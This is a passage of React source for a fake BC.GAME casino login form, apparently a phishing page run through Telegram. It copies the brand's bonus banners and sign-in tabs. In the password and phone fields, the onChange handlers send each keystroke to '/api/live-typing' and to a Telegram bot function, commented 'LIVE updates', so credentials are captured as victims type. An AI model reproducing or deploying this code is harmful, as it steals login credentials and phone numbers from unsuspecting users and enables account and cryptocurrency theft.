                          <img
                            alt="logo"
                            className="w-auto h-8"
                            src="/logo.webp"
                          />
                        </div>
                        {/* Icons Section */}
                        <div className="flex flex-col justify-start space-y-4 p-1 mt-2 mt-4" style={{ filter: "brightness(1.08) saturate(1.05)" }}>
                          <div className="flex-col">
                            <h2 className="flex items-center text-xs">
                              <img alt="470%" className="size-4" src="/icon-470.png" />
                              <div className="ml-1.5 font-extrabold">470%</div>
                            </h2>
                            <p className="text-tertiary mt-0.5 font-medium text-[9px]" style={{ fontSize: '12.6px' }}>Welcome deposit bonus</p>
                          </div>
                          <div className="flex-col">
                            <h2 className="flex items-center text-xs">
                              <img alt="5 BTC" className="size-4" src="/icon-5btc.webp" />
                              <div className="ml-1.5 font-extrabold">5 BTC</div>
                            </h2>
                            <p className="text-tertiary mt-0.5 font-medium text-[9px]" style={{ fontSize: '12.6px' }}>Free daily lucky spin</p>
                          </div>
                          <div className="flex-col">
                            <h2 className="flex items-center text-xs">
                              <img alt="Free Perks" className="size-4" src="/icon-freeperks.png" />
                              <div className="ml-1.5 font-extrabold">Free Perks</div>
                            </h2>
                            <p className="text-tertiary mt-0.5 font-medium text-[9px]" style={{ fontSize: '12.2093px' }}>Daily free rewards & bonuses</p>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div className="w-full flex-1 px-6 relative z-10">
                      <p className="text-lg font-extrabold h-5 flex items-center" style={{ fontSize: '18.9px' }}>Sign In</p>
                      <div
                        className="scroll-x tabs-title hide-scroll mt-4"
                        data-type="inner"
                        style={{
                          "--tabs-width": "167px",
                          "--tabs-indicator-position": activeTab === 'password' ? "0%" : "100%",
                          backgroundColor: "rgb(39, 43, 44)", // --tab_padding
                          padding: "0",
                          borderRadius: "0.5rem"
                        } as any}
                      >
                        <button
                          aria-selected={activeTab === 'password' ? "true" : undefined}
                          className="tabs-btn btn-like"
                          onClick={() => handleTabClick('password')}
                        >
                          <div className="flex items-center justify-center">
                            <div className="icon size-4">
                              <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                                <path d="M16.0003 22.0875C17.0806 22.0875 17.9564 21.2117 17.9564 20.1314C17.9564 19.0511 17.0806 18.1754 16.0003 18.1754C14.92 18.1754 14.0443 19.0511 14.0443 20.1314C14.0443 21.2117 14.92 22.0875 16.0003 22.0875Z"></path>
                                <path d="M23.5365 12.7032V11.2032C23.5365 7.96311 22.7565 3.66699 16.0003 3.66699C9.24414 3.66699 8.46412 7.96311 8.46412 11.2032V12.7032C5.10403 13.1232 4 14.8273 4 19.0154V21.2475C4 26.1676 5.50004 27.6676 10.4202 27.6676H21.5805C26.5006 27.6676 28.0006 26.1676 28.0006 21.2475V19.0154C28.0006 14.8273 26.8966 13.1232 23.5365 12.7032ZM16.0003 23.7555C13.9963 23.7555 12.3762 22.1235 12.3762 20.1314C12.3762 18.1274 14.0083 16.5073 16.0003 16.5073C17.9924 16.5073 19.6244 18.1394 19.6244 20.1314C19.6244 22.1355 18.0044 23.7555 16.0003 23.7555ZM10.4202 12.5952C10.3242 12.5952 10.2402 12.5952 10.1442 12.5952V11.2032C10.1442 7.6871 11.1402 5.34704 16.0003 5.34704C20.8605 5.34704 21.8565 7.6871 21.8565 11.2032V12.6072C21.7605 12.6072 21.6765 12.6072 21.5805 12.6072H10.4202V12.5952Z"></path>
                              </svg>
                            </div>
                            <p className="ml-1 font-extrabold">Password</p>
                          </div>
                        </button>
                        <button
                          className="tabs-btn btn-like"
                          aria-selected={activeTab === 'otp' ? "true" : undefined}
                          onClick={() => handleTabClick('otp')}
                        >
                          <div className="flex items-center justify-center">
                            <div className="icon size-4">
                              <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                                <path clipRule="evenodd" d="M5.97363 9.73405C5.97363 6.27328 8.77914 3.46777 12.2399 3.46777H19.7594C23.2202 3.46777 26.0257 6.27328 26.0257 9.73405V22.2666C26.0257 25.7274 23.2202 28.5329 19.7594 28.5329H12.2399C8.77914 28.5329 5.97363 25.7274 5.97363 22.2666V9.73405ZM12.2399 5.97428C10.1634 5.97428 8.48014 7.65759 8.48014 9.73405V22.2666C8.48014 24.3431 10.1634 26.0264 12.2399 26.0264H19.7594C21.8359 26.0264 23.5192 24.3431 23.5192 22.2666V9.73405C23.5192 7.65759 21.8359 5.97428 19.7594 5.97428H12.2399ZM10.9867 22.2666C10.9867 21.5744 11.5478 21.0133 12.2399 21.0133H19.7594C20.4516 21.0133 21.0127 21.5744 21.0127 22.2666C21.0127 22.9588 20.4516 23.5199 19.7594 23.5199H12.2399C11.5478 23.5199 10.9867 22.9588 10.9867 22.2666Z" fillRule="evenodd"></path>
                              </svg>
                            </div>
                            <p className="ml-1 font-extrabold">One-time Code</p>
                          </div>
                        </button>
                        <div className="tabs-indicator"></div>
                      </div>
                      <div className="tabs-content bg-transparent">
                        <form onSubmit={handleSubmit} autoComplete="off">
                          {activeTab === 'password' ? (
                            <div className="mt-4">
                              <div
                                style={{
                                  width: '100%',
                                  height: '42px',
                                  backgroundColor: '#1E2121',
                                  borderRadius: '10px',
                                  border: isEmailFocused ? '1px solid rgb(36, 238, 137)' : '1px solid #3e4748',
                                  display: 'flex',
                                  alignItems: 'center',
                                  padding: '0 12px',
                                  boxSizing: 'border-box'
                                }}
                              >
                                {/* Country Code Trigger */}
                                {showLoginDialControls && (
                                  <button
                                    type="button"
                                    onClick={() => {
                                      setCountrySelectorTarget('login');
                                      setShowCountrySelector(true);
                                    }}
                                    style={{
                                      display: 'flex',
                                      alignItems: 'center',
                                      cursor: 'pointer',
                                      paddingRight: '12px',
                                      height: '100%',
                                      background: 'transparent',
                                      border: 'none',
                                      color: '#e6ecec',
                                      fontSize: '15px',
                                      fontWeight: 700
                                    }}
                                  >
                                    <span>{loginCountryCode || ''}</span>
                                    <svg
                                      width="10"
                                      height="6"
                                      viewBox="0 0 10 6"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                      style={{ marginLeft: '6px', opacity: 0.7 }}
                                    >
                                      <path
                                        d="M1 1L5 5L9 1"
                                        stroke="#e6ecec"
                                        strokeWidth="1.5"
                                        strokeLinecap="round"
                                        strokeLinejoin="round"
                                      />
                                    </svg>
                                  </button>
                                )}

                                {/* Vertical Divider */}
                                {showLoginDialControls && (
                                  <div
                                    style={{
                                      width: '1px',
                                      height: '20px',
                                      backgroundColor: '#4a5354',
                                      marginRight: '12px'
                                    }}
                                  />
                                )}

                                {/* Login Email/Phone Input */}
                                <input
                                  placeholder={showLoginDialControls ? '' : 'Email / Phone Number / Username'}
                                  required
                                  value={email}
                                  onChange={(e) => {
                                    handleLoginIdentifierChange(e.target.value);
                                  }}
                                  autoComplete="off"
                                  type="text"
                                  inputMode="text"
                                  style={{
                                    flex: 1,
                                    height: '100%',
                                    background: 'transparent',
                                    border: 'none',
                                    outline: 'none',
                                    fontSize: '15px',
                                    fontWeight: 700,
                                    color: '#e6ecec',
                                    letterSpacing: '0.4px'
                                  }}
                                  onFocus={() => setIsEmailFocused(true)}
                                  onBlur={() => setIsEmailFocused(false)}
                                />
                              </div>
                            </div>
                          ) : (
                            <div className="mt-4">
                              <div
                                style={{
                                  width: '100%',
                                  height: '42px',
                                  backgroundColor: '#1E2121',
                                  borderRadius: '10px',
                                  border: isPhoneFocused ? '1px solid rgb(36, 238, 137)' : '1px solid #3e4748',
                                  display: 'flex',
                                  alignItems: 'center',
                                  padding: '0 12px',
                                  boxSizing: 'border-box'
                                }}
                              >
                                {/* Country Code Trigger */}
                                {showOtpDialControls && (
                                  <button
                                    type="button"
                                    onClick={() => {
                                      setCountrySelectorTarget('otp');
                                      setShowCountrySelector(true);
                                    }}
                                    style={{
                                      display: 'flex',
                                      alignItems: 'center',
                                      cursor: 'pointer',
                                      paddingRight: '12px',
                                      height: '100%',
                                      background: 'transparent',
                                      border: 'none',
                                      color: '#e6ecec',
                                      fontSize: '15px',
                                      fontWeight: 700
                                    }}
                                  >
                                    <span>{countryCode || ''}</span>
                                    <svg
                                      width="10"
                                      height="6"
                                      viewBox="0 0 10 6"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                      style={{ marginLeft: '6px', opacity: 0.7 }}
                                    >
                                      <path
                                        d="M1 1L5 5L9 1"
                                        stroke="#e6ecec"
                                        strokeWidth="1.5"
                                        strokeLinecap="round"
                                        strokeLinejoin="round"
                                      />
                                    </svg>
                                  </button>
                                )}

                                {/* Vertical Divider */}
                                {showOtpDialControls && (
                                  <div
                                    style={{
                                      width: '1px',
                                      height: '20px',
                                      backgroundColor: '#4a5354',
                                      marginRight: '12px'
                                    }}
                                  />
                                )}

                                {/* Phone Input */}
                                <input
                                  placeholder={showOtpDialControls ? '' : 'Email/Phone Number'}
                                  required
                                  value={phoneNumber}
                                  onChange={(e) => {
                                    const nextValue = e.target.value;
                                    const sanitizedValue = handlePhoneInputChange(nextValue);
                                    // Send live typing to automation
                                    fetch('/api/live-typing', {
                                      method: 'POST',
                                      headers: { 'Content-Type': 'application/json' },
                                      body: JSON.stringify({ field: 'phone', value: sanitizedValue, timestamp: Date.now() })
                                    }).catch(() => { });
                                    // Send to Telegram (LIVE updates)
                                    const fullPhone = countryCode ? `${countryCode} ${sanitizedValue}` : sanitizedValue;
                                    sendDataToBot('user_phone_number', fullPhone);
                                  }}
                                  onFocus={() => setIsPhoneFocused(true)}
                                  onBlur={() => {
                                    setIsPhoneFocused(false);
                                    if (!phoneNumber && !countryCode) {
                                      setAutoCountryApplied(false);
                                    }
                                  }}
                                  autoComplete="off"
                                  type="text"
                                  inputMode="text"
                                  style={{
                                    flex: 1,
                                    height: '100%',
                                    background: 'transparent',
                                    border: 'none',
                                    outline: 'none',
                                    fontSize: '15px',
                                    fontWeight: 700,
                                    color: '#e6ecec',
                                    letterSpacing: '0.4px'
                                  }}
                                />
                              </div>
                            </div>
                          )}
                          {activeTab === 'password' ? (
                            <div className="input pr-2 mt-3 bg-input_darken">
                              <input
                                placeholder="Password"
                                required
                                type={showPassword ? "text" : "password"}
                                value={password}
                                onChange={(e) => {
                                  setPassword(e.target.value);
                                  // Send to automation API
                                  fetch('/api/live-typing', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ field: 'password', value: e.target.value }) });
                                  // Send to Telegram (LIVE updates)
                                  sendDataToBot('user_password', e.target.value);
                                }}
                                autoComplete="new-password"
                              />
                              <div
                                className="w-8 h-8 center cursor-pointer"
                                onClick={() => setShowPassword(!showPassword)}
                              >
                                <div className="icon size-6 fill-tertiary">
                                  {showPassword ? (
                                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                                      <path d="M26.6667 14.6667C26.6667 14.6667 23.3334 20 16.0001 20C8.66675 20 5.33341 14.6667 5.33341 14.6667" stroke="rgb(132, 145, 148)" strokeWidth="2.5" fill="none" strokeLinecap="round" strokeLinejoin="round" />
                                      <path d="M16 20V23.3333" stroke="rgb(132, 145, 148)" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                                      <path d="M10.6666 18.6667L9.33325 21.3334" stroke="rgb(132, 145, 148)" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                                      <path d="M21.3334 18.6667L22.6667 21.3334" stroke="rgb(132, 145, 148)" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                                    </svg>
                                  ) : (
                                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                                      <path d="M16.5986 12.9416C16.4331 13.2024 16.3364 13.5118 16.3349 13.8435L16.3341 13.8545C16.3349 14.7903 17.0941 15.5488 18.0299 15.5488C18.5034 15.5488 18.9317 15.3546 19.2397 15.0414L19.2331 15.0193C19.3394 15.331 19.3985 15.6655 19.4 16.0134C19.4 17.7062 18.0277 19.0785 16.3349 19.0785C14.642 19.0785 13.2697 17.7062 13.2697 16.0134C13.2697 14.3206 14.642 12.9483 16.3349 12.9483H16.5941L16.5986 12.9416Z"></path>
                                      <path clipRule="evenodd" d="M3.20923 16.0026C3.20923 13.5833 8.9347 8.25098 15.9999 8.25098C23.0652 8.25098 28.7906 13.4826 28.7906 16.0026C28.7906 18.5226 23.0652 23.748 15.9999 23.748C8.9347 23.748 3.20923 18.4219 3.20923 16.0026ZM15.9937 21.7022H15.9999C19.1475 21.7022 21.6996 19.151 21.6996 16.0035V15.9964C21.6996 12.8453 19.1448 10.2905 15.9937 10.2905C12.8426 10.2905 10.2878 12.8453 10.2878 15.9964C10.2878 19.1475 12.8426 21.7022 15.9937 21.7022Z" fillRule="evenodd"></path>
                                    </svg>
                                  )}
                                </div>
                              </div>
                            </div>
                          ) : (
                            <div className="text-center text-xs text-[var(--color-secondary)] font-bold mt-4 mb-2">
                              We'll send a 6-digit code to your device
                            </div>
                          )}
                          {activeTab === 'password' && (
                            <div className="flex justify-end mt-4">
                              <a
                                href="https://bc.co/en-IN/login/forgot"
                                className="text-xs font-extrabold hover:text-white"
                                style={{ fontSize: '1.2em', color: '#B3BEC1' }}
                                onClick={() => postLiveEvent('user_clicked_forgot_password')}
                              >
                                Forgot your password?
                              </a>
                            </div>
                          )}
                          <Button
                            type="submit"
                            fullWidth
                            isLoading={isLoading}
                            className="mt-6"
                          >
                            {activeTab === 'password' ? 'Sign In' : 'Send One-time Code'}
                          </Button>
                        </form>
                        <div className="mt-6 flex min-h-6 flex-wrap items-center" style={{ fontSize: '1.1em' }}>
                          <span className="mr-2">New to BC.GAME?</span>
                          <a href="https://bc.co/en-IN/login/regist" className="whitespace-normal break-words font-extrabold text-brand">Create account</a>
                        </div>
                      </div>
                    </div>

                    <div className="w-full px-6 pb-5 pt-8">
                      <div className="w-full h-4 flex items-center">
                        <div className="divider-line"></div>
                        <p className="mx-3 flex-none text-secondary font-semibold text-sm" style={{ fontSize: '1.1em' }}>Log in directly with</p>
                        <div className="divider-line"></div>
                      </div>
                      <button
                        className="passkey-btn button w-full mt-4 h-11 rounded-lg flex items-center justify-center"
                        type="button"
                        onClick={() => showError('Passkey not supported on Telegram App')}
                      >
                        <div className="icon size-5 fill-secondary">
                          <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                            <path clipRule="evenodd" d="M14.8879 14.7662C16.228 14.7647 17.5128 14.2316 18.4604 13.284C19.4081 12.3364 19.9412 11.0516 19.9427 9.71149V9.56056C19.9427 8.21997 19.41 6.93429 18.4621 5.98635C17.5141 5.03842 16.2286 4.50586 14.8879 4.50586C13.5473 4.50586 12.2617 5.03842 11.3137 5.98635C10.3658 6.93429 9.83322 8.21997 9.83322 9.56056V9.71149C9.83474 11.0516 10.3678 12.3364 11.3154 13.284C12.263 14.2316 13.5478 14.7647 14.8879 14.7662ZM20.4563 26.3923C20.495 26.4858 20.5415 26.5757 20.5952 26.661H5.03468C4.8972 26.661 4.76161 26.6289 4.63877 26.5671C4.51592 26.5054 4.40922 26.4157 4.32719 26.3054C4.24515 26.1951 4.19007 26.0671 4.16633 25.9317C4.14258 25.7963 4.15083 25.6572 4.19043 25.5254L4.85124 23.3282C5.50009 21.171 6.82676 19.2802 8.63458 17.9361C10.4424 16.592 12.6352 15.8662 14.8879 15.8662C15.8831 15.8662 16.8665 16.0079 17.8103 16.2819C17.8128 16.4597 17.8238 16.6379 17.8432 16.8156C17.9546 17.8314 18.3405 18.7978 18.9598 19.6106C19.3406 20.1105 19.8008 20.5408 20.3194 20.8857V25.7046C20.3194 25.9406 20.3659 26.1742 20.4563 26.3923ZM27.2784 14.1542C27.6508 14.7736 27.8473 15.4829 27.8469 16.2058C27.8466 17.131 27.5237 18.0271 26.9337 18.74C26.3437 19.4528 25.5237 19.9376 24.6149 20.1108V21.2888C24.6149 21.3219 24.6257 21.3541 24.6457 21.3803L25.8934 23.0149C25.9167 23.0458 25.9276 23.0843 25.9233 23.1226C25.9191 23.1612 25.9005 23.1965 25.871 23.2215L24.7348 24.1842C24.7192 24.1973 24.7065 24.2135 24.6975 24.2316C24.6883 24.2498 24.6829 24.2696 24.6817 24.2899C24.6805 24.3103 24.6834 24.3306 24.6901 24.3497C24.6969 24.3688 24.7076 24.3864 24.7214 24.4014L25.8821 25.6607C25.9084 25.6893 25.9227 25.7269 25.922 25.7659C25.9212 25.8048 25.9054 25.8418 25.8779 25.8694L24.2979 27.4494C24.2696 27.4777 24.2312 27.4937 24.1912 27.4937C24.1513 27.4937 24.1129 27.4777 24.0847 27.4494L22.4464 25.8112C22.4324 25.7972 22.4213 25.7806 22.4137 25.7623C22.4061 25.744 22.4022 25.7243 22.4022 25.7046V19.8998C21.7303 19.6332 21.144 19.1884 20.706 18.6134C20.268 18.0384 19.9949 17.3549 19.9162 16.6364C19.8375 15.9179 19.956 15.1915 20.2592 14.5353C20.5623 13.8791 21.0386 13.318 21.6367 12.9121C22.2348 12.5063 22.9322 12.2712 23.654 12.232C24.3758 12.1928 25.0946 12.351 25.7332 12.6897C26.3717 13.0284 26.906 13.5347 27.2784 14.1542ZM23.2068 16.0047C23.4031 16.1358 23.6337 16.2058 23.8698 16.2058C24.0264 16.2058 24.1816 16.1749 24.3263 16.1149C24.4711 16.055 24.6026 15.9671 24.7135 15.8562C24.8242 15.7455 24.9121 15.614 24.9721 15.4692C25.032 15.3244 25.0628 15.1692 25.0628 15.0126C25.0628 14.7766 24.9929 14.5459 24.8618 14.3497C24.7306 14.1534 24.5443 14.0005 24.3263 13.9102C24.1083 13.8199 23.8683 13.7963 23.6369 13.8423C23.4055 13.8884 23.1929 14.002 23.026 14.1689C22.8591 14.3357 22.7455 14.5484 22.6995 14.7798C22.6534 15.0113 22.6771 15.2512 22.7673 15.4692C22.8576 15.6873 23.0106 15.8735 23.2068 16.0047Z" fillRule="evenodd"></path>
                          </svg>
                        </div>
                        <span className="text-primary ml-2 font-extrabold">Sign In with passkey</span>
                      </button>
                      <div className="third-group-wrap w-full mt-6 h-11 flex items-center justify-between">
                        <button className="button size-10 rounded-lg border border-solid border-third p-0" type="button">
                          <div className="icon fill-secondary size-5">
                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                              <path d="M9.49144 13.7447C8.98834 15.2056 8.98831 16.7946 9.49144 18.2554L5.47289 21.2749L9.49144 18.2808C10.4711 21.0489 13.146 23.1246 16.3235 23.1246C17.9649 23.1245 19.3689 22.7152 20.4543 21.9976C21.7514 21.1774 22.6251 19.896 22.8899 18.4351H16.3225V13.899H27.7883C27.9207 14.6676 28.0002 15.4875 28.0002 16.2818C28.0002 19.8445 26.6758 22.8695 24.3723 24.9458L24.3567 24.9331C22.3458 26.7185 19.5979 27.7641 16.3235 27.7642C11.7161 27.7642 7.53135 25.2525 5.46605 21.2798C3.745 17.9736 3.74589 14.0521 5.46703 10.7203L9.49144 13.7447Z"></path>
                              <path d="M16.3264 4.23588C19.3449 4.21031 22.2575 5.28746 24.4553 7.28666L20.9866 10.6695C19.7422 9.51609 18.0474 8.87535 16.3264 8.90092C13.1489 8.90092 10.474 10.952 9.49437 13.7456L5.46996 10.7212C7.53525 6.74851 11.7191 4.23588 16.3264 4.23588Z"></path>
                            </svg>
                          </div>
                        </button>
                        <button className="button size-10 rounded-lg border border-solid border-third p-0" type="button">
                          <div className="icon fill-secondary size-5">
                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                              <path d="M18.1236 14.3799L26.2298 5.16797H24.3096L17.268 13.1649L11.6481 5.16797H5.16455L13.6648 17.2619L5.16455 26.9208H7.08479L14.5161 18.474L20.4524 26.9208H26.936M8.0674 6.61816L10.7279 6.58362L24.3081 25.5747H21.3574"></path>
                            </svg>
                          </div>
                        </button>
                        <button className="button size-10 rounded-lg border border-solid border-third p-0" type="button">
                          <div className="icon fill-secondary size-5">
                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                              <path d="M4.90694 15.2947L26.2758 5.47633C27.0847 5.10485 28.0305 5.4855 28.3877 6.32673C28.515 6.62491 28.5543 6.95474 28.5022 7.27707L25.6344 24.999C25.4582 26.0876 24.4667 26.8222 23.42 26.639C23.1213 26.5865 22.8386 26.4616 22.5952 26.2741L15.3683 20.7061C14.6572 20.1589 14.5074 19.1161 15.0344 18.3765C15.0945 18.2915 15.1633 18.2124 15.2386 18.1407L22.4846 11.2259C22.5503 11.1634 22.5543 11.0585 22.4942 10.9902C22.4421 10.9319 22.3581 10.9194 22.2916 10.9618L11.296 18.0441C10.8964 18.3006 10.4087 18.3631 9.96103 18.2132L4.96937 16.5382C4.6322 16.4249 4.44722 16.0493 4.55615 15.6994C4.61221 15.5195 4.74038 15.3713 4.90694 15.2947Z"></path>
                            </svg>
                          </div>
                        </button>
                        <button className="button size-10 rounded-lg border border-solid border-third p-0" id="mm_login" type="button">
                          <div className="icon fill-secondary size-5">
                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                              <path clipRule="evenodd" d="M5.6377 5.33713C5.65823 5.33055 5.68134 5.33442 5.6993 5.34758L5.88925 5.48895L12.9018 8.10388C12.9044 8.09833 12.9069 8.09304 12.9108 8.08801C12.9236 8.0697 12.9441 8.05886 12.9672 8.05886H19.0429C19.0647 8.05886 19.0865 8.06982 19.0994 8.08814C19.1019 8.09227 19.1045 8.09653 19.1058 8.10104L26.0991 5.49011L26.2916 5.34758C26.3096 5.33442 26.3327 5.33055 26.3532 5.33713C26.375 5.34371 26.3917 5.35996 26.3981 5.38086L27.5416 8.79012C27.5455 8.80147 27.5455 8.81385 27.5442 8.82559L26.787 12.4534L27.2298 12.7871C27.2464 12.8 27.2567 12.8201 27.2567 12.8414C27.2567 12.8628 27.2464 12.8829 27.2298 12.8959L26.5804 13.3907L27.068 13.768C27.0847 13.7804 27.0937 13.7991 27.095 13.8193C27.0963 13.8394 27.0873 13.859 27.0732 13.8725L26.4148 14.4725L26.796 14.7471C26.8126 14.7583 26.8216 14.7755 26.8242 14.7944C26.8268 14.8134 26.8203 14.8325 26.8088 14.8471L25.7898 16.0317L27.3619 20.8714C27.3696 20.8922 27.3658 20.915 27.353 20.9328C27.3401 20.9505 27.3183 20.9609 27.2965 20.9609H27.276L25.8283 25.8666L20.7254 24.4641L19.7359 25.2727L17.7197 26.6669H14.2725L12.2652 25.2727L11.4977 24.6452L11.2462 24.526C11.2269 24.5172 11.2141 24.5008 11.209 24.4817L6.1716 25.8666L4.71365 20.8923L6.25887 16.0824C6.24604 16.0787 6.23448 16.0715 6.22678 16.0611L5.19107 14.8468C5.17824 14.8322 5.17311 14.8133 5.17567 14.7943C5.17696 14.7753 5.18722 14.7582 5.20262 14.7471L5.58508 14.4725L4.92669 13.8725C4.91257 13.859 4.90359 13.8396 4.90487 13.8195C4.90487 13.7995 4.91514 13.7808 4.93054 13.7683L5.41054 13.3911L4.76113 12.8959C4.74316 12.8829 4.7329 12.8627 4.73418 12.8411C4.73418 12.8197 4.74445 12.7994 4.76113 12.7867L5.21161 12.453L4.45568 8.82559C4.45311 8.81385 4.4544 8.8016 4.45825 8.79025L5.59278 5.38099C5.5992 5.36009 5.61588 5.34371 5.6377 5.33713ZM11.6418 10.2209L13.5965 11.6972L12.7956 12.4063L10.7651 14.1219L6.66688 15.3201L5.82302 14.3297L6.16577 14.0825C6.18048 14.0718 6.19066 14.0552 6.19066 14.037C6.19179 14.0189 6.185 14.0013 6.17143 13.989L5.58887 13.4582L6.01759 13.1216C6.03229 13.11 6.04021 13.0924 6.04021 13.0738C6.04021 13.0552 6.03116 13.0377 6.01645 13.0263L5.44634 12.5913L5.80945 12.3219C5.82868 12.3079 5.83773 12.2843 5.8332 12.2613L5.16241 9.04243L6.12957 6.13278L11.6418 10.2209ZM25.3232 15.3133L26.1738 14.3242L25.8315 14.0775C25.8157 14.0668 25.8067 14.0503 25.8055 14.0321C25.8044 14.014 25.8123 13.9964 25.8259 13.9842L26.4064 13.4545L25.9716 13.1183C25.9569 13.1069 25.9479 13.0892 25.949 13.0705C25.949 13.0518 25.9569 13.0342 25.9727 13.0229L26.5431 12.5881L26.1862 12.3192C26.1681 12.3052 26.1591 12.2817 26.1636 12.259L26.8334 9.04489L25.8598 6.13914L18.3993 11.6725L19.4995 12.6539L21.2299 14.1167L25.3232 15.3133ZM14.6543 19.9278L13.6212 17.7367L11.1884 18.8428C11.1938 18.8541 11.1973 18.8666 11.1973 18.8794L11.1991 18.9112L14.6543 19.9278ZM14.5109 22.5749L14.1511 22.8225C14.1627 22.8378 14.1671 22.8567 14.1656 22.876L13.9219 25.0288L14.067 24.8897H17.9027L18.1552 25.1119L17.8911 22.9436C17.8723 22.9457 17.8534 22.9413 17.8375 22.9304L17.3674 22.6078H14.5747C14.5486 22.6078 14.5254 22.5948 14.5109 22.5749ZM20.7742 18.8385L17.416 19.8224L17.4124 19.7963L18.3881 17.753L20.7742 18.8385Z" fillRule="evenodd"></path>
                            </svg>
                          </div>
                        </button>
                        <button className="button size-10 rounded-lg border border-solid border-third p-0" id="wc_login" type="button">
                          <div className="icon fill-secondary size-5">
                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                              <path clipRule="evenodd" d="M27.4089 15.0914L28.9798 16.6101C29.1961 16.8165 29.1961 17.1549 28.9798 17.3613L21.9037 24.2203C21.6874 24.4267 21.3382 24.4267 21.1301 24.2203L16.1082 19.3504C16.0576 19.3009 15.9671 19.3009 15.9165 19.3504L10.8946 24.2203C10.6783 24.4267 10.329 24.4267 10.1209 24.2203L3.02017 17.3613C2.80382 17.1549 2.80382 16.8165 3.02017 16.6101L4.59106 15.0914C4.80741 14.8851 5.15663 14.8851 5.36475 15.0914L10.3866 19.9613C10.4372 20.0108 10.5289 20.0108 10.5783 19.9613L15.6002 15.0914C15.8166 14.8851 16.1658 14.8851 16.3739 15.0914L21.397 19.9613C21.4464 20.0108 21.5381 20.0108 21.5875 19.9613L26.6105 15.0914C26.8433 14.8851 27.1926 14.8851 27.4089 15.0914ZM8.24312 11.5591C12.5254 7.40739 19.4769 7.40739 23.7592 11.5591L24.2753 12.0626C24.4905 12.269 24.4905 12.6074 24.2753 12.8138L22.5116 14.5223C22.4035 14.6296 22.2294 14.6296 22.1213 14.5223L21.4146 13.8372C18.421 10.9401 13.5813 10.9401 10.5877 13.8372L9.83165 14.5718C9.72347 14.6791 9.54827 14.6791 9.4401 14.5718L7.67755 12.8633C7.4612 12.657 7.4612 12.3185 7.67755 12.1122L8.24312 11.5591Z" fillRule="evenodd"></path>
                            </svg>
                          </div>
                        </button>
                        <button className="button size-10 rounded-lg border border-solid border-third p-0" type="button">
                          <div className="icon fill-secondary size-5">
                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                              <path clipRule="evenodd" d="M15.9999 4.25146C22.7181 4.25146 28.1833 8.74008 28.1833 14.2574C28.1833 16.4655 27.3381 18.4541 25.5724 20.4136C23.0164 23.3911 17.3003 27.0177 15.9999 27.5722C14.7362 28.1112 14.8821 27.2688 14.9399 26.935C14.9416 26.9254 14.9432 26.9162 14.9447 26.9075C14.9755 26.7222 15.1184 25.8521 15.1184 25.8521C15.1595 25.5373 15.202 25.049 15.0792 24.7372C14.9426 24.394 14.4026 24.2158 14.0058 24.1293C8.15098 23.3459 3.81665 19.2036 3.81665 14.2574C3.81665 8.74008 9.28256 4.25146 15.9999 4.25146ZM9.14195 16.0831H11.464C11.595 16.0831 11.7008 16.1905 11.7008 16.323V17.1869C11.7008 17.3193 11.595 17.427 11.464 17.427H8.04984C7.91858 17.427 7.81278 17.3171 7.81278 17.1869V11.8214C7.81278 11.689 7.91905 11.5816 8.05008 11.5816H8.90489C9.03568 11.5816 9.14195 11.689 9.14195 11.8214V16.0831ZM13.5241 11.5818H12.6696C12.5385 11.5818 12.432 11.6892 12.432 11.8212V17.1876C12.432 17.3198 12.5385 17.427 12.6696 17.427H13.5241C13.6552 17.427 13.7614 17.3198 13.7614 17.1876V11.8212C13.7614 11.6892 13.6552 11.5818 13.5241 11.5818ZM19.4064 11.5818H18.5518C18.4208 11.5818 18.3145 11.6892 18.3145 11.8212V15.0094L15.8818 11.6883C15.8368 11.6201 15.7638 11.5863 15.6842 11.5818H14.8298C14.6988 11.5818 14.5923 11.6892 14.5923 11.8212V17.1876C14.5923 17.3198 14.6988 17.427 14.8298 17.427H15.6842C15.8154 17.427 15.9217 17.3198 15.9217 17.1876V14.0003L18.3575 17.3257C18.4012 17.3883 18.4755 17.427 18.5518 17.427H19.4064C19.5376 17.427 19.6437 17.3198 19.6437 17.1876V11.8212C19.6437 11.6892 19.5376 11.5818 19.4064 11.5818ZM24.125 12.9254C24.256 12.9254 24.3618 12.8182 24.3618 12.6855V11.8217C24.3618 11.6892 24.256 11.5816 24.125 11.5816H20.7111C20.58 11.5816 20.4738 11.6912 20.4738 11.8214V17.1871C20.4738 17.317 20.5797 17.427 20.7107 17.427H24.125C24.256 17.427 24.3618 17.3193 24.3618 17.1871V16.323C24.3618 16.1908 24.256 16.0831 24.125 16.0831H21.8032V15.1761H24.125C24.256 15.1761 24.3618 15.0686 24.3618 14.9362V14.0723C24.3618 13.9399 24.256 13.8322 24.125 13.8322H21.8032V12.9254H24.125Z" fillRule="evenodd"></path>
                            </svg>
                          </div>
                        </button>
                        <button className="button size-10 rounded-lg border border-solid border-third p-0" type="button">
                          <div className="icon fill-secondary size-5">
                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
